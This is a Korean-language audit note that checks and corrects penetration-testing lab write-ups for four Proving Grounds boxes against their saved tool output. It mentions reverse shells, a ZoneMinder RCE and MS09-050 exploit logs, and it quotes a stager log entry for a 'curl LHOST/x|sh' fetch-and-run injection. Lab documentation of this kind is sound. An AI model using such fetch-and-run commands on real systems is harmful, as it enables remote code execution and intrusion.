---
tags:
  - type/audit
  - platform/pg
manual_tags: true
---
# 웨이브 7 적대적 검증 — Cobbles · Internal · BossPlayersCTF · Bratarina + `_PLAYBOOK` 이관

감사일 2026-08-25. 대상: 개작된 4개 노트 + `_PLAYBOOK` 신규 10항목·병합분.
증거원: `~/PG/<박스>/` 산출물(Kali 10.44.44.128) · 볼트 `파일보관\` · `_backup/*.bak` · `zm-src` 클론 소스.

---

## 1. 고친 것

### Cobbles.md

| 위치(문자열) | 무엇이 틀렸나 | 어떻게 고쳤나 |
|---|---|---|
| `아웃바운드는 443·ICMP·53 이 막혀 있고 80 만 열려 있었음` | **잘못된 인과 — 산출물이 스스로 반증.** `WEB_ENTRY_FINDING.txt` 가 명시: "earlier 443/80 reverse-shell tests fired against the NON-EXISTENT snapshot view, so nothing executed -> **egress is NOT confirmed blocked**." 그 프로브(`try1_icmp.log` 05:56·`try2_oob.log` 05:57, 둘 다 `0 packets captured`)는 존재하지 않는 sink 로 발사돼 **실행된 적이 없음.** 이후 필터 경로의 무회신도 타입저글링 삼킴으로 설명됨. CLAUDE.md §2 「80만 허용이라고 단정하지 마라」 위반이자, 노트가 인용하는 `_PLAYBOOK` A-31 과의 **내부 모순** | `[!warning]` 콜아웃으로 강등. 「확정된 것은 성공 회선이 tcp/80 이라는 것뿐」 + `egress2~4.log` 의 `…248.214.80 > …45.207.x` 는 connect-back 이 아니라 **타겟 Apache 응답(source port 80)** 이라는 오독 경고 추가 |
| `타겟은 Debian bullseye 의 PHP 7.4 이고` | PHP 버전을 찍은 산출물 없음 — 배포판 기본값 추론을 단정형으로 씀 | 단정 삭제. 별도 `[가정]` 문단으로 강등하되 **관측된 실패(`Executing '0 …'`) 자체가 PHP 7 계열 비교 의미론의 증거**라는 근거를 남김 |
| `zm_post.sh` 코드펜스 | 원본 2행 `# usage: zm_post.sh <datafile-…>` 가 펜스에서 누락 | 원문대로 복원 |
| `rce.data` / `rsh80.data` 캡션 | 발췌인데 전문처럼 표기(`sort_field`·`sort_asc`·`limit` 등 누락) | 캡션에 「발췌」와 누락 필드 명시 |
| `셸을 잡자마자 표준 열거를 훑고 아래를 배제함` | `sudo -l`·SUID·`getcap`·crontab·`secure_file_priv`·`docker.sock` **6항목 전부 산출물 부재.** 리버스셸 내부 실행이라 `~/.zsh_history` 에도 없음 → **날조가 아니라 `근거부족`**(부재 증거 상한) | 목록은 유지하고 「산출물 미보존 · 원문 재확인 불가 · `[가정]` 취급」 캡션 추가 |
| `(_PLAYBOOK A-26 신규)` · `A-23 참조` · `A-13 참조` · `신규 예정: … B-20 ZoneMinder Filter RCE` | 평문 참조 + **`B-20` 은 실재하지 않는 번호**(실제 항목은 `B-1-10`) | 전부 실재 앵커 `[[_PLAYBOOK#…]]` 로 교체. `A-16` 링크 신설 |

### Internal.md

| 위치(문자열) | 무엇이 틀렸나 | 어떻게 고쳤나 |
|---|---|---|
| `49152-49158/tcp open     unknown                 (동적 RPC 포트, 부팅마다 바뀜)` | **가짜 코드펜스 — 최우선 지적 ⓑ 적중.** `nmap.log` 원문은 `49152/tcp`~`49158/tcp` **7줄**이고, 한 줄로 압축한 데다 **한국어 저자 주석을 펜스 안에 넣음.** 실측 블록에 없는 문자열 | 원문 7줄 그대로 복원, 주석은 캡션으로 이동 |
| nmap 펜스 헤더 `# nmap -sCV -p- …` | 실제 헤더(`# Nmap 7.98 scan initiated … --privileged …`)를 손으로 다시 씀. `Warning: … retransmission cap hit (10).` 과 `Not shown: 65521 closed tcp ports (reset)` 두 줄 삭제. `Service Info:` 의 CPE 2개 절단 | 전부 원문 복원 |
| ```[smb2_recheck.log, 실패 후]  \|_smb2-capabilities: …``` | **가짜 코드펜스.** 두 파일의 출력을 한 펜스에 합치고 `[파일명, 상태]` 라벨을 펜스 «안»에 삽입. `\| smb2-capabilities:` 머리줄도 누락 | 두 개의 독립 펜스로 분리, 각각 원문 그대로 + 캡션(파일·시각)으로 라벨 이동. `srv.sys` 는 안 죽어 오판하기 쉽다는 해설 산문 추가 |
| `net user` / `aaron  Administrator  Guest  jack  niky  tim` | 실제 출력 8줄(헤더·구분선·2열 배치·`The command completed with one or more errors.`)을 **한 줄로 재작성** | 원문 복원 |
| `whoami /all` 발췌 | 특권 4개를 나열하며 **원문 순서를 바꿈**(실제는 SeDebug → SeImpersonate). 헤더 행 없음 | 원문 순서·헤더 행 복원 |
| `### Privilege Escalation – 불필요` | **4항목 전부 없음**(구조 결손 ⓒ). Cobbles·Bratarina 와도 불일치 | 4항목 추가(전부 「해당 없음」 + 사유·근거) |
| `대화형 cmd.exe 프롬프트(웹셸 아님) — 타겟 pty 캡처, 실측` | Windows `cmd` 를 `nc` 로 받은 것이라 **유닉스 pty 는 개입하지 않음.** 「pty 캡처」는 부정확한 단정 | 「`nc` 로 받은 대화형 `cmd.exe` 세션 캡처 · 프롬프트가 타겟이 보낸 실측 바이트」로 정정. 웹셸 아님 판정은 유지 |
| `버전 판정 — 독립 근거 2개` 의 근거② | `smb-protocols` **dialect 목록은 버전 근거가 아님** — 그것은 취약성의 전제 | 근거①을 53/tcp DNS 배너(`Microsoft DNS 6.0.6001 … Server 2008 SP1`, SMB 와 독립 서비스), 근거②를 `smb-os-discovery` 로 재배치. dialect 는 「취약성의 전제」로 역할 재기술 |

### BossPlayersCTF.md

| 위치(문자열) | 무엇이 틀렸나 | 어떻게 고쳤나 |
|---|---|---|
| `(sudo 바이너리 없음 — PwnLab 류)` | harvest 원문은 `(sudo 바이너리 없음 — PwnLab 류. 이 반사는 접어라)` — 펜스 안 문장을 **잘라냄** | 원문 복원 |
| `# nmap --privileged … --top-ports 1000 ...` | 헤더를 `...` 로 절단하고 `Nmap scan report`·`Host is up`·`Not shown: 998 closed tcp ports (reset)` 삭제 | 원문 복원 |
| `# nmap --privileged -Pn -n -sCV -p 22,80 ...` | 헤더 절단 + `PORT STATE SERVICE VERSION` 헤더행·`ssh-hostkey` 3줄 삭제 | 원문 복원 |
| `정찰 일반화는 [[_PLAYBOOK]] 로 넘김` / `## 관련` | **이 박스가 만든 `_PLAYBOOK` 4항목(A-16·B-1-11·B-36·B-83) 중 노트가 걸어둔 앵커가 0건.** 이관은 됐으나 되찾을 길이 없었음 | `## 관련` 에 4개 앵커 + `D`(시간 배분 표) 링크 추가, 본문 참조도 A-16 으로 지정 |

### Bratarina.md

| 위치(문자열) | 무엇이 틀렸나 | 어떻게 고쳤나 |
|---|---|---|
| `12:57:13 "GET /x:sh HTTP/1.1" 404     <- curl LHOST/x\|sh 인젝션의 흔적…` | **가짜 코드펜스.** `http_stager.log` 원문 형식(`192.168.248.71 - - [20/Aug/2026 …] … 404 -`)을 시각+요청으로 **재포맷**하고 `<- 저자 해설` 을 펜스 «안»에 삽입. `code 404, message File not found` 3줄 삭제 | 원문 8줄 전량 복원, 해설은 펜스 밖 불릿으로 |
| `revalidate_http.log` 펜스 | `code 404, message File not found` 2줄 누락 | 원문 복원 |
| `### Privilege Escalation – 없음` | 「4항목은 생략」이라고 **명시적으로 선언**했으나 STANDARD 는 각 finding 에 4항목을 요구. 같은 웨이브의 Cobbles 는 채웠음 → 웨이브 내 불일치 | 4항목 추가(전부 「해당 없음」 + 사유·근거) |
| 이관 손실 — `84초` | 백업 §6 의 **「치환을 필터링으로 오독해 `CURLTEST`/`WGETTEST` 에 84초를 씀」 인과가 노트에서도 `_PLAYBOOK` 에서도 사라짐** | 노트 본문에 ⚠️ 한 줄 복원 + `_PLAYBOOK` B-23 문자제약 불릿에 동일 인과 추가 |

### `_PLAYBOOK.md`

| 위치 | 무엇이 틀렸나 | 어떻게 고쳤나 |
|---|---|---|
| `#### B-83.` (구 844행) | **`## C. 반사 체크리스트` «아래»에 삽입됨.** B-8 절이 아니라 C 절 소속이 됨 — 절 구조 파괴 | `## C.` 헤딩 앞(B-82 뒤)으로 이동. **제목·번호는 그대로** 두어 앵커 무손상 |
| `#### B-23.` 문자 제약 불릿 | Bratarina 84초 인과 미도착 | 불릿 1행 추가 |

---

## 2. 삭제한 것

없음. 모든 정정이 **복원·강등·재배치**로 처리됨. 유일하게 본문에서 빠진 단정은 아래 둘이고, 원문을 여기 인용해 둠:

1. Cobbles — `> 아웃바운드는 443·ICMP·53 이 막혀 있고 80 만 열려 있었음(_PLAYBOOK A-31 참조). LHOST 를 tcp/80 으로:`
2. Cobbles — `> 타겟은 Debian bullseye 의 PHP 7.4 이고,` (문장 일부)

---

## 3. 반증한 것 — 지적으로 올랐다가 노트가 옳았던 것

| 의심 | 확인 결과 |
|---|---|
| BossPlayersCTF `(sudo 바이너리 없음 — PwnLab 류)` 가 펜스 안 저자 해설 = 가짜 펜스 | **반증.** `harvest_www-data.txt:25` 에 그대로 있음 — `harvest.sh` 가 출력하는 진짜 문자열. 오히려 노트가 원문을 **잘라 쓴 것**이 문제였음 |
| Cobbles `zm-src/web/includes/Object.php:247` 행번호 오류(내 sed 계산으로 246) | **반증.** `grep -n` 이 정확히 247 을 반환. `Filter.php:8-12`·`zmfilter.pl.in:998` 도 전부 정확 |
| Bratarina `manual_domain: true` 가 미지원 프론트매터 | **반증.** `extract.py:171` `MANUAL_DOM_RE` 로 정식 지원 |
| BossPlayersCTF·Bratarina 의 pty 프롬프트가 창작(지목 ⓔ) | **반증 — 전부 실측.** BossPlayersCTF: `shell443.log` 에 `www-data@bossplayers:…$`·`bash-5.0#` 이 그대로 있고, `session_bpc-shell.txt` 에 **로컬 에코 중복**과 `pty.spawn` 원문(5~6행)이 남음. `tty` → `/dev/pts/0`. Bratarina: `shell.log`·`verify_shell.log` 에 `root@bratarina:~#` 이 원문 그대로(캐리지리턴 잔재 포함) |
| Cobbles·Internal 이 「산출물에 pty 없음」이라 판정한 것 | **양쪽 다 옳음.** Cobbles 는 셸 세션 로그 자체가 없고(노트도 그렇게 적음), Internal 은 `listener_443.log`/`flag_evidence.txt` 가 Windows `cmd` 세션이라 pty 개념이 성립하지 않음. **네 워커의 상반된 판정은 오류가 아니라 박스별 사실 차이였음** |
| `_PLAYBOOK` 이 기존 항목을 덮어쓰거나 지웠는가(지목 ⓕ) | **반증.** `.bak3` 대비 **삭제 0행 / 추가 92행** — 순수 append/insert. 절 제목·번호 변경 0건 |
| 노트 4개에서 nmap raw 라인이 지워졌는가(지목 ⓓ) | **반증.** `PORT_RE` 대상 라인이 4개 노트 전부에 살아 있음(Cobbles 22·80 / Internal 53·135·139·445·3389·5357·49152-58 / BossPlayers 22·80·443·8080·9 / Bratarina 22·25·53·80·445) |
| 노트 구조(Target 래퍼 · 두 IA 제목 상이 · 관련 H2)가 결손됐는가(지목 ⓒ 일부) | **반증.** 4개 전부 기준 노트 `Robust.md` 와 절 구조가 **완전 일치**. 결손은 PrivEsc 4항목 2건뿐이었음 |

---

## 4. 총괄 판단이 필요한 것 (혼자 고치지 않음)

1. **태그 taxonomy 분열** — `tech/rce/cmd-injection`(Bratarina·ClamAV·PwnLab 3건) vs `tech/web/cmd-injection`(10건 이상, `extract.py:104` 의 **정식 목록에 있는 쪽**). `manual_tags: true` 라 통과하지만 색인이 갈림. 3개 노트에 파급되므로 §8 상 총괄 몫.
2. **색인 갱신 필요** — 4개 노트 + `_PLAYBOOK` 수정. `refresh.ps1` 미실행(공유 인프라).
   ⚠️ BossPlayersCTF 의 nmap raw 복원으로 `443/tcp closed`·`8080/tcp closed`·`9/udp closed` 라인이 본문에 있음(복원 전에도 있었음). `ports` 프론트매터는 `[22, 80]` — 갱신 후 오염 여부 확인 권장.
3. **`_STATUS.md` 판정 변화 없음** — Cobbles 부분(1/2) · Internal 완료(1/1) · BossPlayersCTF 완료(2/2) · Bratarina 완료(1/1). 이 감사가 판정을 바꾸지 않음.

---

## 5. 근거 출처

- Kali 산출물 — `~/PG/Cobbles/`(80파일: `nmap.log`·`WEB_ENTRY_FINDING.txt`·`writeup_notes.txt`·`traces_confirmed.log`·`try1_icmp.log`·`try2_oob.log`·`egress2~4.log`·`rce.data`·`rsh80.data`·`mon.data`·`zm_post.sh`·`admin.hash`·`burst_uniq.txt`·`zm-src/`) · `~/PG/Internal/`(`nmap.log`·`nmap_smbvuln.log`·`listener_443.log`·`try3_ms09050_padded.log`·`smb2_recheck.log`·`smb_postrevert2.log`·`flag_evidence.txt`·`harvest_admin.txt`·`msfvenom_shellcode.txt`·`traces_confirmed.log`·`exploits/`) · `~/PG/BossPlayersCTF/`(`nmap-*.txt`·`shell443.log`·`session_bpc-shell.txt`·`harvest_www-data.txt`·`writeup_notes.txt`) · `~/PG/Bratarina/`(`nmap.log`·`shell.log`·`verify_shell.log`·`http_stager.log`·`revalidate_*.log`·`www/x`·`www/e`)
- 볼트 `파일보관\` — `PG-Cobbles-{login,serverstatus,zm-console,zm-version}.png` 4장 · `PG-BossPlayersCTF-{index,robots,workinginprogress,rce-cmd-id}.png` 4장 **전부 실재**. Internal·Bratarina 는 0장이고 **두 노트 모두 그 사실을 본문에 적어 둠** — 정확
- 1차 사료 — `~/PG/Cobbles/zm-src` 태그 1.34.23 클론(`web/includes/Filter.php`·`Object.php`·`scripts/zmfilter.pl.in`)
- 백업 — `_backup/{Cobbles,Internal,BossPlayersCTF}.md.bak` · `_backup/Bratarina.md.bak2` · `_backup/_PLAYBOOK.md.bak3`
- 직접 실행 — `ssh kali "…"` 로 위 파일 전량 `cat`/`grep -n`; 볼트에서 앵커 29건 전수 해석 검증(파이썬, 미해결 0건); 4개 노트 + `Robust.md` 절 구조 대조
